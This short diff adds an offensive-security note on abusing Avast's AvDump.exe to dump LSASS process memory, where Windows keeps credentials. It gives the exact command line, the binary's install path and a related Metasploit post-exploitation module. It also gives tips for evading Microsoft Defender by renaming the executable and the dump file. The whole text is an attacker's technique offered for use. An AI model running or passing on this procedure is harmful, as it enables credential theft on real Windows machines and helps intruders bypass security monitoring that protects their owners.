@@ -1,0 +1,7 @@
+Dumping LSASS with AV
+Sometimes Antivirus is attackers' best friend. Here is how you can use Avast AV to dump lsass memory 
+Commands: 
+.\AvDump.exe --pid 704 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
+To bypass Microsoft Defender, remember to rename the AvDump.exe file. Also, don't use the name lsass.dmp (see screenshot).
+There's also Metasploit post exploitation module for this under post/windows/gather/avast_memory_dump
+AvDump.exe is located at C:\Program Files\Avast Software\Avast. 
